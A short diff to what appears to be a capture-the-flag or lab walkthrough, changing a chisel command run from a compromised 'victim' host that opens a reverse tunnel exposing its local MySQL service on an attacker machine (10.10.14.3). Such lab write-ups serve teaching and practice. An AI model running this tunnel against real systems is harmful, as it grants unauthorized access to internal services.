@@ -189,6 +189,6 @@
 
       From victim:
 
-      `./chisel client 10.10.14.3:9002 R:3306:127.0.0.1:3306`
+      `./chisel client 10.10.14.3:9002 R:13306:127.0.0.1:3306`
 
-      We can now access MySQL (3306) from our attacking machine.
+      We can now access MySQL (13306) from our attacking machine.
